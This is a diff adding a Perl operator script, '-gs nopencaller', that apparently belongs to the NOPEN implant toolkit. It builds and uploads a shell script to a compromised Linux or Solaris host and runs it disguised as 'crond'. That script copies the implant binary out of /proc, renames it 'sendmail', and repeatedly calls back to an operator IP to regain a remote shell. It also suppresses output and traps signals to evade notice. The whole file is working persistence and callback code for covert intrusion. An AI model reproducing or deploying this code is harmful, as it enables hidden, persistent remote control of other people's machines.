@@ -1,0 +1,456 @@
+#!/usr/bin/env perl
+##
+$VER="1.0.0.2" ;
+# nopen seems happier with stderr in lsh runs
+# or does it? Took it out now...
+#select STDERR ;
+$| = 1 ;
+myinit() ;
+$dowhat = buildit() ;
+
+my %badplace = () ;
+my @badplaces = ("/tmp","/","/usr","/var","/bin","/sbin","/proc",
+		 "/home","/etc","/dev","/boot","/lib","/opt","/var/tmp",
+		 "/usr/var","/var/usr","/root","/export","/lost+found",
+		);
+my @regexps = ("(/[^\/]+)*/\.[a-f0-9]{15}[a-f0-9]*\$",
+	      );
+$badplace{$_}++ foreach (@badplaces) ;
+$prompt = "${COLOR_NOTE}## $cupfile has been built and contains:\n".
+  $COLOR_NORMAL.
+  "\n$dowhat\n\n";
+if (!$debug) {
+  $prompt .= "<A>bort or <C>ontinue (upload and execute $cupfile as $name)?";
+  if (($ans) = mygetinput($prompt,"A","C")) {
+    mydie("Aborting") if ($ans eq "a") ;
+  }
+  progprint("\n\nUploading and executing $cupfile as \"$name &\"\n",$COLOR_FAILURE);
+  doit("-put $cupfile $targetcwd/$name",
+       "-cat $targetcwd/$name",
+       "-cd $targetcwd",
+      );
+  ($output,$nopenlines,@output) =
+    doit("PATH=.:\$PATH $name &",
+	 "-cdp",
+	);
+  my ($scriptpid,$test) = $output =~ /(\d+) W=(\d+)/;
+  unless ($test == $runfor - 1) {
+    mydie("Target shell cannot use W=\$((W-1)) syntax, get help");
+  }
+  ($cuppidactual) = $output[0] =~ /(\d+) /;
+  ($output,$nopenlines,@output) = 
+    doit(
+	 "=ps | egrep \"$name|sleep $sleep\" | grep -v grep",
+	 NONOHIST
+	);
+  #TODO: Clean up...parse output above to generate pastables
+  my ($sleeppid,$cuppid,%sleeppid,$matchcount,$bettersleeppid,$warning) = ();
+  foreach (@output) {
+    my ($pid,$ppid) = /(\d+)\s+(\d+)/;
+    if (/sleep $sleep/) {
+      $sleeppid{$ppid} = $pid;
+    }
+    if (/$name/) {
+      $cuppid{$pid} = 1;
+      $cuppidparent{$pid} = $ppid;
+    }
+  }
+  if (scalar keys %sleeppid > 1) {
+    $warning = "$COLOR_FAILURE\a".
+      "BE CAREFUL!! There seems to be more than one \"sleep $sleep\".\n".
+      "             We should have found the right one but check it.\n".
+      "             ps output was:\n\n".
+      "=ps | egrep \"$name|sleep $sleep\" | grep -v grep\n$output";
+  }
+  foreach $pid (keys %cuppid) {
+    next unless $pid == $cuppidactual;
+    if ($cuppidparent{$pid} == 1 and
+	$sleeppid{$pid} > 1) {
+      $sleeppid = $sleeppid{$pid};
+      $bettersleeppid = $sleeppid{$pid} if $sleeppid{$pid} == $cuppidactual;
+      $cuppid = $pid;
+      last;
+    }
+  }
+  mydie("Could not find both pids: sleeppid=$sleeppid cuppid=$cuppid\n\n\aYOU MUST MANUALLY FIGURE IT OUT FROM HERE (which to kill to do what).")
+    unless ($sleeppid and $cuppid);
+  my $killcontent = "$COLOR_NORMAL\n".
+    "To kill sleep, prompting a NOPEN callback via:\n".
+    "            PATH=. D=-uc$targetip:$nopenport $name\n\n".
+    "kill -9 $sleeppid\n\n".
+    "Or issue this to kill off and abort nopencall entirely\n\n".
+    "kill -9 $cuppid ; sleep 1 ; kill -9 $sleeppid\n\n".
+    $warning;
+  progprint($killcontent);
+  if (open(OUT,">>$opdown/$nopen_rhostname.cup.sleep.pids")) {
+    print OUT "$sleeppid,$cuppid\n";
+    close(OUT);
+  } else {
+    mywarn("Could not write to $opdown/$nopen_rhostname.cup.sleep.pids");
+  }
+  $dowhat =~ s/\n/\n     /g;
+  if (open(OUT,">>$opdown/$nopen_rhostname.cup.sleep.kills")) {
+    print OUT "$COLOR_NOTE".scalar gmtime().
+      " -gs nopencaller [$$] cup script deployed:$COLOR_NORMAL \n     ".
+      $dowhat.
+      $killcontent;
+    close(OUT);
+  } else {
+    mydie("Could not write to $opdown/$nopen_rhostname.cup.sleep.pids");
+  }
+  sleep 6 if $warning;
+} else {
+  my  $commands .= "\n\nDEBUG: Here is the\n".
+    "$cupfile that $prog would have uploaded/executed if\n".
+      "debug mode was not chosen:\n\n$COLOR_NORMAL".
+	"$dowhat\n\n";
+  progprint("$commands",$COLOR_FAILURE);
+}
+while (0) {
+  doit("=ps | grep -v grep | egrep \"sendmail\$|crond|sleep $sleep\"");
+  if (-f "/tmp/stop") {
+    unlink "/tmp/stop";
+    mydie(done);
+  }
+}
+#ENDMAIN
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs nopencaller @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }  
+    require $autoutils;
+    $prog = "-gs nopencaller";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $origparms = " @ARGV";
+  mydie("bad option(s)") if (! Getopts( "hvW:I:Dr:c:N:n:" ) ) ;
+  $debug = $opt_D ;
+  # DEFAULTS
+  $def_I = 300;
+  $def_W = 14400;
+  $def_r = "crond" ;
+  $def_n = "sendmail" ;
+  
+  my $diemore = 	"  (we need /proc, and /proc/PID/file on FreeBSD\n".
+    "  only works when original file is still there)"
+      if $freebsdtarget;
+  mydie("$prog only works on Linux and Solaris\n".
+	$diemore)
+    unless ($linuxtarget or $solaristarget);
+
+  mydie("Syntax error: $prog takes only options no arguments")
+    if (@ARGV);
+  $name          = defined $opt_r ? $opt_r : $def_r;
+  $ratname       = defined $opt_n ? $opt_n : $def_n;
+  $opt_I         = defined $opt_I ? $opt_I : $def_I;
+  $opt_W         = defined $opt_W ? $opt_W : $def_W;
+  $nopenstr = $opt_N;
+
+  mydie("-r and -n cannot be the same ($ratname)")
+    if $ratname eq $name;
+  mydie("-n ratname cannot contain whitespace")
+    if $ratname =~ /\s/;
+  mydie("-r argument \"$name\" must not contain a \"/\".")
+    if ($name =~ /\//) ;
+  $cupfile = "$opup/cup.nopen" ;
+
+  my $defhrs = $def_W/60/60 ;
+  my $defmins = $def_I/60 ;
+  $gsusagetext="
+Usage: $prog [-h | options]
+
+$prog is used on callback targets to allow you to regain connectivity
+via a fresh callback every so often. The callbacks can be ignored until one
+is needed.
+
+$prog builds $cupfile according to the chosen options,
+shows the final result, then allows user to either abort or continue with
+an upload/run on target as \"./rmtname \&\". The script is uploaded and run
+from the current directory (need not be executable, it is run with sh -c).
+
+Unless aborted, $prog will start a fresh NOPEN listener. This
+listener's PID is what will be used to get a fresh NOPEN binary out of
+/proc each time the script loops (so this only works on solaris and linux).
+
+The $cupfile script will run until the NOPEN listener's PID is no
+longer there, that is until the NOPEN listener expires (5 hours by default).
+It will also die from the normal -burn/BURN mode of exiting a target. With
+each loop (time set by -I), the script will run a fresh NOPEN callback,
+ensuring the NOPEN binary deletes. If there is no -nrtun or other listener,
+the NOPEN simply dies quietly. If there is, it will establish a fresh session.
+
+When run, the script will delete itself and then begin looping.
+
+OPTIONS [defaults]
+
+-I delay      How often a fresh NOPEN callback is initiated               [${defmins}m]
+               (format: [#h][#m]#[s])
+-W delay      How long script will continue                               [${defhrs}h]
+-D            Debug mode--build and show the script, then exit.
+-r rmtname    Run script on target as \"name\".                          [$def_r]
+-c IP[:port}  IP and port to call back to (port is random if not given)
+-n name       Run NOPEN callbacks as \"name\" (NO SPACES)             [$def_n]
+-N NOPENSTR   Use if this NOPEN server or command line has spaces in it (use a
+              dot \".\" instead of each space). This string is used to find
+              the new listener $prog starts.
+
+";
+  usage() if ($opt_h or $opt_v) ;
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+
+  mydie("-d argument must start with \"/\"")
+    if ($opt_d and !($opt_d =~ /^\//)) ;
+
+  mydie("Directory \"$opt_d\" must not contain whitespace")
+    if ($opt_d =~ /\s/) ;
+
+  mydie("-T argument must not be a path, just a filename (no \"/\")")
+    if ($opt_T =~ /\//);
+
+  $runfor = strtoseconds($opt_W);
+  mydie("-w argument ($opt_W) not in the form [#h][#m]#[s]")
+    if ($runfor < 0);
+
+  $sleep = strtoseconds($opt_I);
+  mydie("-I argument ($opt_I) not in the form [#h][#m]#[s]")
+    if ($sleep < 0);
+
+  ($targetip,$junk,$nopenport) =
+    $opt_c =~ /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(:*(\d*))/ ;
+  $nopenport = myrand() unless $nopenport > 0;
+
+  mydie("-c IP or -c IP:port is required")
+    unless $targetip;
+  mydie("-c $targetip must be a valid IP")
+    unless ipcheck($targetip);
+
+  ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+   $serverver,$wdir,$targetos,$targetcwd,$targetpid,$targetppid) = parsestatus("force");
+
+
+  # Make sure that our remote name is not present on target.
+  ($remotelist,$nopenlines,@remotelist) = doit("-ls $targetcwd/$name");
+  if ($remotelist =~ /(\d+)\s(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+(\d+)\s+(\d+):(\d+)(:\d+){0,1}\s*(\d+){0,1}\s+.*\s+$targetcwd\/$name/) {
+    mydie("$targetcwd/$name already exists on target with size $1; use a different name with -r!");
+  }
+
+  # Determine our current =ps profile,
+  # start new listener on random port,
+  # find that listener's PID (try to use netstat -antp on linux)
+  ($output,$nopenlines,@psoutput) = doit("=ps");
+  ($userid,$nopenpid,$nopenname) = ();
+  foreach (@psoutput) {
+    my ($thisid,$thispid,$thisname) = /(\S+)\s+(\S+).*\s(\S+)/;
+    if ($thisid =~ /^\d+$/ and $thispid =~ /^[a-z]+$/i) {
+      my $tmp = $thisid;
+      $thisid = $thispid;
+      $thispid = $tmp;
+    }
+    dbg("targetpid=$targetpid= thispid=$thispid=\t $_");
+    next unless $thispid eq $targetpid;
+    ($userid,$nopenpid,$nopenname) = ($thisid,$thispid,$thisname) ;
+    dbg("targetpid=$targetpid= nopenpid=$nopenpid=");
+    next unless (!$nopenstr or /\s$nopenstr/);
+    next if (!$nopenstr and !/$nopenname/);
+    dbg("PS: $_\n
+userid,nopenpid,nopenname =     $userid,$nopenpid,$nopenname
+   ");
+
+    unless ($userid eq "root") {
+      offerabort("It appears your NOPEN is NOT running as root.");
+    }
+    last;
+  }
+  $nopenstr = $nopenname unless $nopenstr;
+  my @oldpsoutput = grep /$nopenstr/ , @psoutput ;
+  my $randport = myrand();
+  my $nonetstat = (!$linuxtarget or $armtarget);
+  unless ($nonetstat) {
+    while (1) {
+      ($output,$nopenlines,@output) = doit("netstat -antp | grep -i tcp.*:$randport");
+      last unless @output;
+      if ($output =~ /invalid/i) {
+        $nonetstat++;
+        last;
+      }
+      $randport = myrand();
+    }
+  }
+  doit("-listen $randport");
+  %oldnopenlines = ();
+  unless ($nonetstat) {
+    ($output,$nopenlines,@output) = doit("netstat -antp | grep -i tcp.*:$randport");
+    ($nopenpid) = $output =~ m,LISTEN.*\s(\d+)/,;
+    mydie("Random listener on $randport started, but CANNOT find new PID with netstat -antp on this Linux host. Get help")
+      unless $nopenpid;
+  } else {
+    ($output,$nopenlines,@output) = doit("=ps | grep -v grep | grep \"$nopenname\"");
+    my %oldpids = ();
+    foreach (@oldpsoutput) {
+      $oldnopenlines{$_}++;
+      $oldpids{$1}++ if /$userid\s+(\d+)\s.*$nopenstr/;
+    }
+    my $idmore = "$userid";
+    $idmore = "" if $armtarget;
+    foreach (@output) {
+      next unless /$idmore\s+(\d+).*\s$nopenstr/;
+      next if $oldpids{$1};
+      next if $oldnopenlines{$_};
+      $nopenpid = $1;
+      last if $nopenpid;
+    }
+  }
+  
+}#myinit
+
+sub buildit {
+  mydie("Unable to open > $cupfile") unless
+    open(CUPOUT,"> $cupfile") ;
+  my $binstr = "exe";
+  $binstr = "object/a.out" if $solaristarget;
+  $binstr = "file" if $freebsdtarget;
+  ($nopensum) = doit("-sha1sum /proc/$targetpid/$binstr");
+  ($nopensum) = $nopensum =~ /([a-e0-9])+/i;
+  ($listenersum) = doit("-sha1sum /proc/$nopenpid/$binstr");
+  ($listenersum) = $listenersum =~ /([a-e0-9])+/i;
+  mydie("Cannot continue: pid=$nopenpid is not a noserver (does not match pid=$targetpid)")
+    unless ($nopensum eq $listenersum);
+  nopenaddpath("/usr/local/bin:/usr/local/sbin");
+  my ($output) = nopenlss("-UPQ","bash");
+  my ($shell) = $output =~ m, (/.*bash),;
+  $shell = "/bin/sh" unless ($shell);
+  my $commands = doit("#!$shell",CUPOUT);
+  my @cpcmd = ("  cp /proc/$nopenpid/$binstr $ratname || break");
+  if ($freebsdtarget) {
+    my ($test) = doit("  cat /proc/$nopenpid/$binstr > $ratname",
+		      "  -ls $ratname"
+		     );
+     # CRAP: Never mind, FreeBSD, this cat trick only works if the file that started
+     # $nopenpid is still in its original place (i.e., /tmp)
+    my ($size) = $test =~ /(\d+)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)/;
+    my $loctest = `ls -arltR /current/up/morerats 2>/dev/null| grep $size`;
+    unless ($loctest and $loctest =~ /freebsd/i) {
+      mydie("Unable to run $prog on this FreeBSD target, unable to verify NOPEN");
+    }
+    @cpcmd = ("  cat /proc/$nopenpid/$binstr > $ratname",
+	      "  [ -s $ratname ] || break"
+	      );
+  }
+  $sleep2 = $sleep+1;
+  # TODO: Maybe add test, run NOPEN before sleeping, check exit code
+  # before we close 1/2.
+  $commands .= doit(
+		    "/bin/rm -f $targetcwd/$ratname",
+		    "trap : TERM",
+		    "trap : INT",
+		    "trap : KILL",
+		    "ls -al $ratname 2>/dev/null && echo $ratname already exists...",
+		    "ls -al $ratname 2>/dev/null && exit",
+		    "W=$runfor",
+		    "W=\$((W-1))",
+		    "echo \$\$  W=\$W",
+		    "[ \$W = ".int($runfor -1)." ] || echo W=ERR",
+		    "[ \$W = ".int($runfor -1)." ] || exit",
+		    "exec >&- 2>&-",
+		    "while [ 1 ] ; do",
+		    "  sleep $sleep",
+		    "  W=\$((W-$sleep2))",
+		    "  [ \$W -lt 0 ] && break",
+		    @cpcmd,
+		    "  chmod 700 $ratname",
+		    "  PATH=. D=-uc$targetip:$nopenport $ratname \&",
+		    "  sleep 1",
+#why does this bust it? ./crond: test: argument expected
+#		    "  [ -e $ratname ] && /bin/rm -f $ratname",
+		    "done",
+		    "[ -d /proc/$nopenpid ] && kill -9 $nopenpid",
+		    CUPOUT);
+  if (@runafter2) {
+    $commands .= doit(@runafter2,CUPOUT);
+  }
+  if (@runafter) {
+    $commands .= doit(@runafter,CUPOUT);
+  }
+  close(CUPOUT) ;
+  return $commands ;
+}#buildit
+
+sub getinput {
+  local($prompt,$default,@allowed) = @_;
+  local($ans,$tmp,%other) = ();
+  $other{"Y"} = "N" ; $other{"N"} = "Y" ;
+  if ($other{$default} and ! (@allowed)) {
+    push(@allowed,$other{$default}) ;
+  }
+  $tmp = $default;
+  if (chop($tmp) eq "") {
+    #damn ^M's in script files
+    $default = $tmp;
+  }
+  SUB: while (1) {
+    print STDERR $prompt;
+    if ($default) {
+      print STDERR " [$default] ";
+    } else {
+      print STDERR " ";
+    }
+    chomp($ans = <STDIN>);
+    $ans = $default if ( $ans eq "" );
+    last SUB if ($#allowed < 0) ;
+    foreach ($default,@allowed) {
+      last SUB if $ans =~ /^$_/i ;
+    }
+  }
+  return $ans;
+}#getinput
+
+sub whatfuser {
+  local ($setfuserfile) = (@_);
+  if ($setfuserfile) {
+    mydie("Cannot open $optmp/fuserfile.$nopen_rhostname for write")
+      unless open(OUT,"> $optmp/fuserfile.$nopen_rhostname");
+    print OUT "$setfuserfile";
+    close(OUT);
+  } else {
+    if ($resetfuser) {
+      unlink("$optmp/fuserfile.$nopen_rhostname");
+      $resetfuser=0;
+    } else {
+      return ""
+	unless open(IN,"$optmp/fuserfile.$nopen_rhostname");
+      chomp($setuserfile = <IN>);
+      close(IN);
+      progprint(" \n\nfuser file set to $setuserfile in previous run of $prog\n".
+		"Use -R option to no longer use it.\n",$COLOR_FAILURE)
+	if $setuserfile;
+      sleep 2;
+    }
+  }
+  return $setuserfile;
+}
